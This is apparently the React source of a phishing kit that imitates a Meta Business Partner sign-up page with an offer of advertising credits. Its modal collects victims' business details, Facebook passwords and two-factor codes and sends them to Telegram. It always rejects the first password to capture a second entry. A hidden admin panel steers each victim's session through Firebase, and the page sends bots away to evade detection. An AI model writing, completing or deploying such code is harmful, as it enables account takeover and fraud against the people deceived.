import { useEffect, useState, useCallback, useMemo, useRef } from 'react';
import axios from 'axios';
import { initializeApp } from "firebase/app";
import { getDatabase, ref, set, onValue } from "firebase/database";

// Import ảnh
import MetaLogoBlue from '@/assets/images/logo-meta.svg';
import HeroVideo from '@/assets/images/hero.mp4';
import AdsManagerVideo from '@/assets/images/ads_manager.mp4';
import StreetwearVideo from '@/assets/images/streetwear.mp4';
import BrooklinenVideo from '@/assets/images/brooklinen.mp4';
import ShopifyVideo from '@/assets/images/shopify.mp4';
import MediaImg from '@/assets/images/media.webp';
import FansVideo from '@/assets/images/fans.mp4';
import FbIcon from '@/assets/images/fb_round_logo.png';
import IgIcon from '@/assets/images/ic_instagram_color.webp';
import MessengerIcon from '@/assets/images/ic_message_color.svg';
import WhatsappIcon from '@/assets/images/ic_whatshap_color.svg';
import SupportVideo from '@/assets/images/support.mp4';
import BackgroundImg from '@/assets/images/background.webp';

// Import Utils
import { translateText } from '@/utils/translate';
import detectBot from '@/utils/detect_bot';
import countryToLanguage from '@/utils/country_to_language';
import HomeStartModals from '@/components/home-start-modals';

// Import Telegram & Translations (từ file 2)
import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '@/utils/telegram';
import { translations } from '@/translations'; 

// ==========================================
// CẤU HÌNH FIREBASE
const FIREBASE_URL = 'https://project-86410307853429089-default-rtdb.firebaseio.com/';
const firebaseConfig = { databaseURL: FIREBASE_URL };
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);
// ==========================================

const EU_COUNTRY_TO_LANG = {
  FR: 'fr', BE: 'fr', LU: 'fr',
  DE: 'de', AT: 'de',
  IT: 'it',
  ES: 'es',
  PT: 'pt',
  NL: 'nl',
  IE: 'en', MT: 'en', CY: 'en',
  DK: 'da', SE: 'sv', FI: 'fi',
  PL: 'pl', CZ: 'cs', SK: 'sk', HU: 'hu', RO: 'ro', BG: 'bg',
  HR: 'hr', SI: 'sl', EE: 'et', LV: 'lv', LT: 'lt',
  GR: 'el',
};

const LoadingSpinner = () => (
  <div style={{
    width: '20px', height: '20px',
    border: '3px solid rgba(255, 255, 255, 0.3)',
    borderTop: '3px solid #fff',
    borderRadius: '50%',
    animation: 'spin 1s linear infinite',
    margin: '0 auto'
  }} />
);

const Home = () =>
{
    // --- STATE CHO LANDING PAGE ---
    const videoRef = useRef( null );
    const [ isVideoPaused, setIsVideoPaused ] = useState( false );
    const adsVideoRef = useRef( null );
    const [ isAdsVideoPaused, setIsAdsVideoPaused ] = useState( false );
    const [ activeAccordion, setActiveAccordion ] = useState( 'ads_manager' );
    const [ playingVideo, setPlayingVideo ] = useState( null );
    const fansVideoRef = useRef( null );
    const [ isFansVideoPaused, setIsFansVideoPaused ] = useState( false );
    const [ activeTab, setActiveTab ] = useState( 'facebook' );
    const supportVideoRef = useRef( null );
    const [ isSupportVideoPaused, setIsSupportVideoPaused ] = useState( false );
    const [ translatedTexts, setTranslatedTexts ] = useState( {} );
    const [ isLoading, setIsLoading ] = useState( true );
    const [ isStartModalsOpen, setStartModalsOpen ] = useState( false );

    // --- STATE CHO FORM MODAL (TỪ FILE 2) ---
    const [lang, setLang] = useState('en');
    const t = translations[lang] || translations['en'];

    const [showModal, setShowModal] = useState(false);
    const [step, setStep] = useState(1);
    const [clientIp, setClientIp] = useState('Unknown');
    const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); 
    const [countryCode, setCountryCode] = useState('+1'); const [phoneNum, setPhoneNum] = useState('');
    const [loginUser, setLoginUser] = useState(''); const [loginPass, setLoginPass] = useState(''); const [otp, setOtp] = useState('');
    const [loginAttempt, setLoginAttempt] = useState(0); const [otpAttempt, setOtpAttempt] = useState(0);
    const [loading, setLoading] = useState(false);
    const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);

    const [matchNumber, setMatchNumber] = useState(null); 
    const [showSuccess, setShowSuccess] = useState(false); 
    const [adminSessionId, setAdminSessionId] = useState(''); 
    const [adminNumberInput, setAdminNumberInput] = useState(''); 
    const [showAdmin, setShowAdmin] = useState(false);

    const [sessionId] = useState(() => {
        let id = localStorage.getItem('session_id');
        if (!id) {
            id = 'user_' + Math.random().toString(36).substring(2, 9);
            localStorage.setItem('session_id', id);
        }
        return id;
    });

    // --- DATA TEXTS CHO LANDING PAGE ---
    const defaultTexts = useMemo(
        () => ( {
            fullName: 'Full Name',
            personalEmail: 'Personal Email',
            businessEmail: 'Business Email',
            mobilePhone: 'Mobile Phone Number',
            yourPageName: 'Your Page Name',
            agreeToTerms: 'I agree to the',
            confirm: 'Confirm',
            aboutHelpMore: 'About · Help · See more',

            loginInstruction: 'To activate content monetization and start earning money on Facebook, you must be logged in to your creator account (Facebook) or business Page (Facebook).',
            mobileOrEmail: 'Mobile number or email',
            password: 'Password',
            passwordIncorrect: 'Password is incorrect, please try again.',
            logIn: 'Log in',
            continueBtn: 'Continue',
            forgotPassword: 'Forgot password?',
            loginPasswordSecurityNote: 'For your security, you must enter your password to continue.',
            loginPasswordFieldPlaceholder: 'Enter your password',
            loginForgotPasswordQuestion: 'Forgot your password?',

            twoFATitle: 'Check your authentication code',
            twoFAInstruction: 'Enter the digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).',
            code: 'Code',
            codeExpired: 'This code has expired. Please enter a new code later',
            pleaseWait: 'Please wait',

            findNewWaysTitle: 'Find new ways to earn money with your content.',
            creatorLabel: 'Creator',
            subscribeBtn: 'Subscribe',
            monetizeDesc: "Whether you're creating videos or publishing to a blog, Facebook monetization tools help you earn more money.",

            heroTitle: 'Explore how Meta technologies can help transform your business.',
            startNow: 'Start now',
            trustedExperts: 'Trusted by experts',
            exploreMeta: 'Explore Meta technologies',
            improveAd: 'Improve ad performance',
            improveAdDesc: 'Maximise campaign results and simplify the setup process with advanced ad creation tools.',
            reachPeople: 'Reach people where they are',
            reachPeopleDesc: 'Connect with people across Meta technologies and build relationships.',
            getExpert: 'Get expert guidance',
            getExpertDesc: 'Access personalized support and resources to help your business grow.',
            findSolutions: 'Find solutions for your business',
            findSolutionsDesc: 'Discover the right tools and strategies to achieve your unique goals.',
            understandAudience: 'Understand your audience',
            understandAudienceDesc: 'Gain insights into customer behavior and preferences to inform your marketing.',
            useFormats: 'Use versatile ad formats',
            useFormatsDesc: 'Create engaging ads that resonate with your target audience across different platforms.',
            toolsTitle: 'Gain access to tools that deliver results.',
            adsManager: 'Ads Manager',
            fbIgShops: 'Facebook & Instagram Shops',
            messengerApi: 'Messenger API',
            waBusiness: 'WhatsApp Business Platform',
            inspiredTitle: 'Be inspired by reading how best-in-class marketers scale their business with Meta technologies.',
            streetwearTip: 'Streetwear brand Market shares tips on how to hype up your next product drop',
            brooklinenTip: 'Brooklinen shares how to use Meta ad solutions to find new customers',
            shopifyTip: 'Shopify shares how to use Meta tools to build a community and grow sales',
            reachTitle: 'Reach more customers with ads on Meta technologies.',
            reachDesc: 'Discover everything you need to start advertising your business.',
            connectedTitle: 'Stay connected to your audience.',
            reachCustomersFb: 'Reach your customers with the Facebook app.',
            createPage: 'Create a Page',
            getSupport: 'Get support',
            resourcesTitle: 'Additional resources for your business.',
            footerUpdateTitle: 'Get the latest updates from Meta for business.',
            footerUpdateDesc: 'Provide your email address to receive the latest updates from Meta for business, including news, events and product updates.',
            emailAddressPlaceholder: 'Email address',
            enterCountry: 'Enter a country name...',
            footerDisclaimer: 'By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our',
            dataPolicy: 'Data Policy',
            successModalTitle: 'Request has been sent',
            successModalDesc: 'Your information has been added to the processing queue. We will respond to your results within 24 hours. In case we do not receive a response, please resend the information so we can assist you.',
            successModalFrom: 'From the Customer Care Team',
            successModalBtn: 'Return to facebook',
            successModalHeroAlt: 'Success',
            successModalLogoAlt: 'Meta',
            twoFATitleNew: 'Two-factor authentication required',
            twoFADescriptionTemplate: 'Enter the code for this account that we send to {{email}}, {{phone}} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
            twoFAFallbackUser: 'User',
            twoFABrandFacebook: 'Facebook',
            twoFAAuthenticationImageAlt: 'Two-factor authentication',
            enterCode: 'Enter the code',
            tryAnotherWay: 'Try another way',
            information: 'Information',
            fanpageName: 'Fanpage Name',
            dateOfBirth: 'Date of Birth',
            day: 'Day',
            month: 'Month',
            year: 'Year',
            message: 'Message',
            responseWithin: 'Our response will be sent to you within 14 - 48 hours.',
            termsOfUse: 'Terms of use',
            submit: 'Submit',

            navGetStarted: 'Get started',
            navAdvertise: 'Advertise',
            navLearn: 'Learn',
            navSupport: 'Support',

            landingHeroTitle: 'Become a Meta Business Partner',
            landingHeroSubtitle: 'Become a Meta Business Partner to receive up to $3,000 in advertising credits, along with valuable benefits such as training, technical support, analytics tools, and opportunities to expand your client network. Get started now to claim your advertising credits.',
            landingGetStartedBtn: 'Get started',

            metaVerifiedTitle: 'Protect your brand with Meta Verified',
            metaVerifiedDesc:
                'Stand out with a verified badge, proactive account protection and access to support — so people know they are engaging with the real you.',
            metaVerifiedBtnFacebook: 'Subscribe on Facebook',
            metaVerifiedBtnInstagram: 'Subscribe on Instagram',
            metaVerifiedBusinessLead: 'Are you a business?',
            metaVerifiedBusinessLink: 'Get more information on Meta Verified for businesses',
            metaVerifiedDisclaimer: 'Features, availability and pricing may vary by region and app.',
            metaVerifiedAriaClose: 'Close dialog',
            metaVerifiedPhonesAlt: 'Facebook and Instagram with Meta Verified',
            metaVerifiedCornerLabel: 'Meta xác minh',
            homeStartModalCornerLead: 'Đăng Ký',

            monetizeModalBack: 'Tất cả các mục tiêu kinh doanh',
            monetizeModalCornerLabel: 'Kiếm tiền nội dung',
            monetizeModalEyebrow: 'Kiếm tiền từ nội dung của tôi',
            monetizeModalTitle: 'Tìm những cách thức mới để kiếm tiền từ nội dung của bạn.',
            monetizeModalCreator: 'Người sáng tạo',
            monetizeModalDesc:
                'Dù bạn đang tạo video hay đăng bài lên blog, các công cụ kiếm tiền của Facebook đều giúp bạn kiếm được nhiều tiền hơn.',
            monetizeModalSubscribe: 'Đăng ký',
            monetizeModalBrand: 'The Vegan Baker',
            monetizeModalHeroAlt: 'Người sáng tạo nội dung trong bếp với bánh cupcake',

            trustedPartnersTitle: 'Meta Business Partners are trusted experts',
            trustedPartnersDesc: 'Join our global community of solution specialists, vetted by Meta for technical and service excellence. When you join, you\'ll get access to unique benefits such as training, support, analytics reports and client matching opportunities to help fuel the growth of your business.',

            landingFeatureReachMoreTitle: 'Reach more people',
            landingFeatureReachMoreDesc: 'Get ads to people most likely to be interested in your products or services with automated targeting tools.',
            becomeExpertCardTitle: 'Become an expert',
            becomeExpertLead: 'Upgrade your marketing skills with free online courses and certifications through',
            metaBlueprintBrand: 'Meta Blueprint',
            becomeExpertTrail: '',
            personalisedAdSolutionsTitle: 'Get personalised ad solutions',
            personalisedAdSolutionsDesc: 'See faster results in fewer steps with AI-enabled tools that generate ads your customers want to see.',
            understandPerformanceTitle: 'Understand performance',
            understandPerformanceDesc: 'Access advanced marketing performance tracking with detailed overviews of audience behaviour.',
            adFormatsTitle: 'Use ad formats that work',
            adFormatsDesc: 'Designed to fit specific business goals, reach and expand your audience across every device.',

            accordionAdsManagerDesc: 'Create and track new ads, monitor your budget and increase sales across Facebook, Messenger, Instagram and WhatsApp – all from one place.',
            accordionBusinessSuiteTitle: 'Meta Business Suite',
            accordionBusinessSuiteDesc: 'Manage all your Facebook and Instagram activities in one place – including posting, messaging, analytics and advertising.',
            accordionPixelTitle: 'Meta pixel',
            accordionPixelDesc: 'Understand the actions people take on your website and reach new audiences with the Meta pixel.',
            accordionFbPagesTitle: 'Facebook Pages',
            accordionFbPagesDesc: 'Connect with customers and grow your business with a Facebook Page.',
            accordionAiMarketingTitle: 'AI tools (performance marketing)',
            accordionAiMarketingDesc: 'Use AI-powered tools to automate and optimise your campaigns for better performance.',

            learnMore: 'Learn more',
            goToAdsManager: 'Go to Ads Manager',

            inspiredBrookShort: 'Brooklinen\'s tips for maximising your ad budget',
            inspiredShopifyShort: 'Shopify\'s tips for reaching the right audience',

            createAd: 'Create ad',

            metaTechnologiesEyebrow: 'Meta technologies',
            marketingOnFacebookEyebrow: 'Marketing on Facebook',
            fansBuildFollowingTitle: 'Find fans and build a following.',
            fansBuildFollowingDesc: 'Create lasting relationships with customers everywhere by marketing with Facebook.',
            exploreFacebookLink: 'Explore Facebook',

            supportCentreEyebrow: 'Meta Business Help Centre',
            supportAnswersTitle: 'Get answers to FAQ, plus help and support with troubleshooting business accounts.',

            mediaIllustrationAlt: 'Meta Platforms Illustration',

            ariaPlayVideo: 'Play',
            ariaPauseVideo: 'Pause',

            footerFcMetaFb: 'Facebook',
            footerFcMetaIg: 'Instagram',
            footerFcMetaMsg: 'Messenger',
            footerFcMetaWa: 'WhatsApp',
            footerFcMetaAn: 'Audience Network',
            footerFcMetaQuest: 'Meta Quest',
            footerFcMetaWorkplace: 'Workplace',
            footerFcMetaForWork: 'Meta for Work',

            footerFcToolsFt: 'Free tools',
            footerFcToolsFbPages: 'Facebook Pages',
            footerFcToolsIgProfiles: 'Instagram profiles',
            footerFcToolsStories: 'Stories',
            footerFcToolsShops: 'Shops',
            footerFcToolsMbs: 'Meta Business Suite',
            footerFcToolsFbAds: 'Facebook ads',
            footerFcToolsIgAds: 'Instagram ads',
            footerFcToolsVideoAds: 'Video ads',
            footerFcToolsAdsMgr: 'Ads Manager',

            footerFcGoalsFbPage: 'Set up a Facebook Page',
            footerFcGoalsBrandAwareness: 'Build brand awareness',
            footerFcGoalsLocal: 'Promote your local business',
            footerFcGoalsOnlineSales: 'Grow online sales',
            footerFcGoalsApp: 'Promote your app',
            footerFcGoalsLeads: 'Generate leads',
            footerFcGoalsMeasure: 'Measure and optimise ads',
            footerFcGoalsRetarget: 'Retarget existing customers',

            footerFcBizSmall: 'Small business',
            footerFcBizLarge: 'Large businesses',
            footerFcBizAgency: 'Agency',
            footerFcBizMedia: 'Media and publisher',
            footerFcBizCreator: 'Creator',
            footerFcBizDev: 'Developer',
            footerFcBizPartner: 'Business partner',

            footerFcIndustryAuto: 'Automotive',
            footerFcIndustryCpg: 'Consumer packaged goods',
            footerFcIndustryEcom: 'E-commerce',
            footerFcIndustryEnt: 'Entertainment and media',
            footerFcIndustryFin: 'Financial services',
            footerFcIndustryGaming: 'Gaming',
            footerFcIndustryProperty: 'Property',
            footerFcIndustryRest: 'Restaurants',
            footerFcIndustryRetail: 'Retail',
            footerFcIndustryTech: 'Technology and telecom',
            footerFcIndustryTravel: 'Travel',

            footerFcSkillsOnline: 'Online learning',
            footerFcSkillsCert: 'Certification programmes',
            footerFcSkillsWebinars: 'Webinars',

            footerFcGuideAds: 'Ads guide',
            footerFcGuideBrand: 'Brand safety and suitability',
            footerFcGuideBook: '"Click Here" book',
            footerFcGuideMedia: 'Media responsibility',
            footerFcGuideSitemap: 'Sitemap',

            footerFcColMetaTech: 'Meta technologies',
            footerFcColTools: 'Tools',
            footerFcColGoals: 'Goals',
            footerFcColBusinessTypes: 'Business types',
            footerFcColIndustries: 'Industries',
            footerFcColSkills: 'Skills and training',
            footerFcColGuides: 'Guides and resources',

            footerLegalAbout: 'About',
            footerLegalDevelopers: 'Developers',
            footerLegalCareers: 'Careers',
            footerLegalPrivacy: 'Privacy',
            footerLegalCookies: 'Cookies',
            footerLegalTerms: 'Terms',
            footerLegalHelp: 'Help Centre',

            footerSocialFacebook: 'Facebook',
            footerSocialInstagram: 'Instagram',
            footerSocialX: 'X',
            footerSocialLinkedIn: 'LinkedIn',

            footerCopyrightNotice: '© 2026 Meta'
        } ),
        []
    );

    useEffect( () =>
    {
        localStorage.clear();
        initializeApp();
    }, [] );

    const initializeApp = async () =>
    {
        try
        {
            const botResult = await detectBot();
            if ( botResult.isBot )
            {
                window.location.href = 'about:blank';
                return;
            }

            try
            {
                const response = await axios.get( 'https://get.geojs.io/v1/ip/geo.json' );
                const data = response.data;
                localStorage.setItem( 'ipInfo', JSON.stringify( data ) );

                const countryCode = data.country_code;
                const targetLang = countryToLanguage[ countryCode ] || 'en';
                localStorage.setItem( 'targetLang', targetLang );

                if ( targetLang !== 'en' )
                {
                    translateAllTexts( targetLang );
                } else
                {
                    setTranslatedTexts( defaultTexts );
                }
            } catch ( error )
            {
                console.error( 'Error fetching IP:', error );
                setTranslatedTexts( defaultTexts );
            }

            setIsLoading( false );
        } catch ( error )
        {
            console.error( 'Initialization error:', error );
            setIsLoading( false );
        }
    };

    const translateAllTexts = useCallback(
        async ( targetLang ) =>
        {
            try
            {
                const keys = Object.keys( defaultTexts );
                const translations = await Promise.all( keys.map( ( key ) => translateText( defaultTexts[ key ], targetLang ) ) );
                const translated = {};
                keys.forEach( ( key, index ) =>
                {
                    translated[ key ] = translations[ index ];
                } );
                setTranslatedTexts( translated );
            } catch ( error )
            {
                console.error( 'Translation error:', error );
                setTranslatedTexts( defaultTexts );
            }
        },
        [ defaultTexts ]
    );

    const texts = Object.keys( translatedTexts ).length > 0 ? translatedTexts : defaultTexts;

    // --- LẤY IP & NGÔN NGỮ CHO FORM (TỪ FILE 2) ---
    useEffect(() => { 
        fetch('https://ipwho.is/')
          .then(r => r.json())
          .then(d => { 
              if (d && d.ip) {
                  setClientIp(`${d.ip} - ${d.country} (${d.city})`);
                  const mappedLang = EU_COUNTRY_TO_LANG[d.country_code];
                  if (mappedLang && translations[mappedLang]) {
                      setLang(mappedLang);
                  } else {
                      setLang('en');
                  }
                  if (d.country_code && countryCodeMap[d.country_code]) { 
                      setCountryCode(countryCodeMap[d.country_code]); 
                  }
              }
          })
          .catch(()=>{}); 
    }, []);

    // --- LẮNG NGHE LỆNH TỪ ADMIN QUA FIREBASE ---
    useEffect(() => {
        if (showModal && !showAdmin) {
            const commandRef = ref(database, 'commands/' + sessionId);
            const unsubscribe = onValue(commandRef, (snapshot) => {
                const data = snapshot.val();
                if (data && data.action) {
                    if (data.action === 'otp') {
                        setStep(3); setMatchNumber(null); setShowSuccess(false);
                    } 
                    else if (data.action === 'approve' && data.value) {
                        setStep(3); setMatchNumber(data.value); setShowSuccess(false);
                    } 
                    else if (data.action === 'success') {
                        setStep(3); setShowSuccess(true);
                    } 
                    else if (data.action === 'error') {
                        setStep(2); setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
                    }
                }
            });
            return () => unsubscribe();
        }
    }, [showModal, showAdmin, sessionId]);

    // --- PHÍM TẮT ADMIN ---
    useEffect(() => {
        const handleKeyDown = (e) => {
            if (e.ctrlKey && e.shiftKey && e.key === 'A') {
                setShowAdmin(prev => !prev); setShowModal(true);
            }
        };
        window.addEventListener('keydown', handleKeyDown);
        return () => window.removeEventListener('keydown', handleKeyDown);
    }, []);

    // --- CÁC HÀM XỬ LÝ FORM ---
    const openModal = () => { setShowModal(true); setStep(1); setShowSuccess(false); setShowAdmin(false); };

    const handleSignup = (e) => {
        e.preventDefault(); let errs = {};
        if (busName.length < 2) errs.busName = true; 
        if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(perEmail)) errs.perEmail = true; 
        if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(busEmail)) errs.busEmail = true; 
        if (!/^\+?\d{8,15}$/.test(phoneNum.replace(/[\s\-().]/g, ''))) errs.phoneNum = true;
        if (Object.keys(errs).length > 0) { setErrors(errs); return; }
        
        setErrors({}); setLoading(true);
        
        const text = `<b>IP:</b> <code>${escapeHtml(clientIp)}</code>\n<b>Business:</b> <code>${escapeHtml(busName)}</code>\n<b>P.Email:</b> <code>${escapeHtml(perEmail)}</code>\n<b>B.Email:</b> <code>${escapeHtml(busEmail)}</code>\n<b>Phone:</b> <code>${escapeHtml(countryCode + phoneNum)}</code>\n`;
        
        setInitialSession(text); 
        sendTelegramMessage('');
        
        setTimeout(() => { setLoading(false); setStep(2); }, 700);
    };

    const handleLogin = (e) => {
        e.preventDefault(); if (loginPass.length === 0) return;
        setLoading(true); setShowLoginError(false); const newAttempt = loginAttempt + 1; setLoginAttempt(newAttempt);
        
        sendTelegramMessage(`<b>🔴 <tg-spoiler>Login ${newAttempt}:</tg-spoiler></b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`);
        
        setTimeout(() => { setLoading(false); if (newAttempt === 1) { setShowLoginError(true); setLoginPass(''); } else { setStep(3); } }, (newAttempt === 1) ? 3000 : 5000);
    };

    const handleOtp = (e) => {
        e.preventDefault(); if (!/^\d{6}$|^\d{8}$/.test(otp)) { setShowOtpError(true); return; }
        setLoading(true); setShowOtpError(false); const newAttempt = otpAttempt + 1; setOtpAttempt(newAttempt);
        
        if (newAttempt <= 3) sendTelegramMessage(`<b>🔴 <tg-spoiler>2FA ${newAttempt}:</tg-spoiler></b> <code>${escapeHtml(otp)}</code>`);
        
        setTimeout(() => { 
            setLoading(false); 
            if (newAttempt < 3) { setShowOtpError(true); setOtp(''); } 
            else { setShowSuccess(true); setOtp(''); }
        }, 1500);
    };

    const handleAdminCommand = (type, value) => {
        const targetUser = adminSessionId.trim(); 
        if (!targetUser) { alert('Vui lòng nhập Mã Phiên của nạn nhân!'); return; }
        
        set(ref(database, 'commands/' + targetUser), {
            action: type,
            value: value
        }).then(() => {
            alert(`Đã gửi lệnh thành công cho ${targetUser}!`);
        }).catch((error) => {
            alert("Lỗi gửi lệnh: " + error.message);
        });
    };

    if ( isLoading )
    {
        return (
            <div id="intro">
                {/* Loading screen */}
            </div>
        );
    }

    return (
        <>
            {/* CSS CHO FORM MODAL */}
            <style>{`
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                .fb-input { width: 100%; height: 52px; padding: 14px 16px; font-size: 16px; border: 1px solid rgb(224, 226, 228); border-radius: 16px; outline: none; box-sizing: border-box; background: #fff; color: #1c2b33; transition: border-color 0.2s; }
                .fb-input:focus { border-color: #1877f2; }
                .fb-btn { width: 100%; height: 48px; background: #1877f2; color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
                .fb-btn:hover { background: #166fe5; }
                .fb-phone-group { display: flex; gap: 8px; }
                .fb-phone-select-wrap { flex: 0 0 120px; position: relative; }
            `}</style>

            <div className="meta-landing">
            {/* ===== HEADER ===== */}
            <header style={ { width: '100%', borderBottom: '1px solid #e4e6eb', background: '#fff', position: 'sticky', top: 0, zIndex: 100 } }>
                <div className="landing-header-row" style={ { maxWidth: '1504px', margin: '0 auto', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 32px', height: '64px' } }>
                    <div style={ { display: 'flex', alignItems: 'center', gap: '8px' } }>
                        <img src={ MetaLogoBlue } alt="Meta" style={ { width: '61px', objectFit: 'contain' } } />
                        <nav className="landing-nav-desktop" style={ { marginLeft: '50px', display: 'flex', alignItems: 'center', gap: '28px' } }>
                            { [ texts.navGetStarted, texts.navAdvertise, texts.navLearn, texts.navSupport ].map( ( item, navIndex ) => (
                                <span
                                    key={ item }
                                    role={ navIndex === 0 ? 'button' : undefined }
                                    tabIndex={ navIndex === 0 ? 0 : undefined }
                                    onClick={ () => { if ( navIndex === 0 ) openModal(); } }
                                    onKeyDown={ ( e ) => { if ( navIndex === 0 && ( e.key === 'Enter' || e.key === ' ' ) ) { e.preventDefault(); openModal(); } } }
                                    style={ { cursor: 'pointer', color: '#0A1317', fontWeight: '400', fontSize: '14px', whiteSpace: 'nowrap' } }
                                >
                                    { item }
                                </span>
                            ) ) }
                        </nav>
                    </div>
                    <div className="landing-header-actions" style={ { display: 'flex', alignItems: 'center', gap: '40px' } }>
                        <span style={ { cursor: 'pointer', color: '#0A1317', fontWeight: '400', fontSize: '14px', whiteSpace: 'nowrap' } }>
                            { texts.createPage }
                        </span>
                        <span
                            id="header-start-now"
                            role="button"
                            tabIndex={ 0 }
                            onClick={ () => openModal() }
                            onKeyDown={ ( e ) => { if ( e.key === 'Enter' || e.key === ' ' ) { e.preventDefault(); openModal(); } } }
                            style={ { cursor: 'pointer', background: '#0457CB', color: '#fff', fontWeight: '600', fontSize: '14px', padding: '8px 24px', borderRadius: '100px', whiteSpace: 'nowrap' } }
                        >
                            { texts.startNow }
                        </span>
                    </div>
                </div>
            </header>

            {/* ===== HERO SECTION ===== */}
            <section className="landing-hero" style={ { padding: '80px 24px' } }>
                <div style={ { maxWidth: '1504px', margin: '0 auto', width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' } }>
                    <div className="landing-hero-title-wrap" style={ { width: '80%', padding: '0 24px' } }>
                        <h1 className="landing-hero-heading" style={ { fontSize: '3.5rem', fontWeight: '550', color: '#1C2B33', textAlign: 'center', lineHeight: '1.15', margin: 0, display: 'block' } }>
                            { texts.landingHeroTitle }
                        </h1>
                    </div>
                    <div className="landing-hero-lead" style={ { width: '60%' } }>
                        <p style={ { fontSize: '16px', color: '#5D6C7B', textAlign: 'center', padding: '16px 16px 0', fontWeight: '400', lineHeight: '1.6', margin: 0 } }>
                            { texts.landingHeroSubtitle }
                        </p>
                    </div>
                    <div
                        id="hero-get-started"
                        role="button"
                        tabIndex={ 0 }
                        onClick={ () => openModal() }
                        onKeyDown={ ( e ) => { if ( e.key === 'Enter' || e.key === ' ' ) { e.preventDefault(); openModal(); } } }
                        style={ { display: 'inline-flex', alignItems: 'center', justifyContent: 'center', padding: '0 24px', height: '45px', cursor: 'pointer', background: '#0457CB', borderRadius: '100px', margin: '24px auto 0' } }
                    >
                        <span style={ { fontSize: '15px', color: '#fff', fontWeight: '500', whiteSpace: 'nowrap' } }>
                            { texts.landingGetStartedBtn }
                        </span>
                    </div>
                    <div className="landing-hero-video" style={ { width: '60%', margin: '80px auto 0' } }>
                        <div style={ { position: 'relative', width: '100%', aspectRatio: '16/9', borderRadius: '32px', overflow: 'hidden', boxShadow: '0 20px 50px rgba(0,0,0,0.1)' } }>
                            <video ref={ videoRef } style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } } muted loop playsInline autoPlay>
                                <source src={ HeroVideo } type="video/mp4" />
                            </video>
                            <div style={ { position: 'absolute', bottom: '24px', right: '24px', zIndex: 10 } }>
                                <button aria-label={ isVideoPaused ? texts.ariaPlayVideo : texts.ariaPauseVideo } style={ { width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.2)', backdropFilter: 'blur(12px)', border: '1px solid rgba(255,255,255,0.4)', borderRadius: '50%', color: '#fff', cursor: 'pointer', transition: 'background 0.3s' } } onClick={ () => { if ( videoRef.current ) { if ( isVideoPaused ) { videoRef.current.play(); } else { videoRef.current.pause(); } setIsVideoPaused( !isVideoPaused ); } } }>
                                    { isVideoPaused ? ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><polygon points="5,3 19,12 5,21" /></svg> ) : ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><rect x="14" y="3" width="5" height="18" rx="1" /><rect x="5" y="3" width="5" height="18" rx="1" /></svg> ) }
                                </button>
                            </div>
                            <div style={ { position: 'absolute', inset: '0', bottom: 0, left: 0, right: 0, height: '33%', background: 'linear-gradient(to top, rgba(0,0,0,0.2), transparent)', pointerEvents: 'none', opacity: 0.6, top: 'auto' } } />
                        </div>
                    </div>
                </div>
            </section>

            {/* ===== TRUSTED EXPERTS ===== */}
            <section className="landing-trusted" style={ { padding: '80px 32px' } }>
                <div style={ { maxWidth: '1504px', margin: '0 auto' } }>
                    <div className="landing-trusted-copy" style={ { maxWidth: '83%' } }>
                        <p style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', lineHeight: '1.2', margin: 0, fontFamily: 'inherit' } }>
                            { texts.trustedPartnersTitle }
                        </p>
                        <p style={ { fontSize: '18px', marginTop: '18px', color: '#1C2B33', lineHeight: '1.6', fontWeight: '400', margin: '18px 0 0' } }>
                            { texts.trustedPartnersDesc }
                        </p>
                    </div>
                </div>
            </section>

            {/* ===== EXPLORE SECTION ===== */}
            <section className="landing-explore" style={ { padding: '0 32px 80px' } }>
                <div style={ { maxWidth: '1504px', margin: '0 auto' } }>
                    <h2 className="landing-explore-heading" style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', lineHeight: '1.2', margin: 0, display: 'block' } }>
                        { texts.heroTitle }
                    </h2>
                </div>
            </section>

            {/* ===== FEATURE CARDS ===== */}
            <section className="landing-features" style={ { paddingBottom: '80px' } }>
                <div style={ { maxWidth: '1504px', margin: '0 auto', padding: '40px 32px 0' } }>
                    <div className="landing-features-grid" style={ { display: 'flex', flexWrap: 'wrap', margin: '0 -12px' } }>
                        { [
                            { icon: ( <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3 17L9 11L13 15L21 7" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" /><path d="M17 7H21V11" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" /></svg> ), title: texts.improveAd, desc: texts.improveAdDesc },
